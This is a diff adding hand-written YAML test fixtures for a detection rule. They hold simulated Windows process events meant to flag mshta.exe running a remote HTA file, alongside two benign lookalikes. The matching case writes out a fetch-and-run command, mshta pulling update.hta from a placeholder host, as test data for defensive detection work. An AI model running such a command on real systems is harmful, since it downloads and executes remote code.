@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "mshta runs a remote HTA"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6228, "ppid": 4000, "exe": "C:\\Windows\\System32\\mshta.exe", "name": "mshta.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "mshta.exe https://downloads.example.invalid/update.hta", "original_name": "MSHTA.EXE", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+nomatch:
+  - desc: "benign lookalike - mshta runs a local HTA"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6240, "ppid": 4000, "exe": "C:\\Windows\\System32\\mshta.exe", "name": "mshta.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "mshta.exe C:\\Tools\\inventory.hta", "original_name": "MSHTA.EXE", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+  - desc: "a browser opens an https URL"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6241, "ppid": 4000, "exe": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "name": "firefox.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "firefox.exe https://example.org/", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
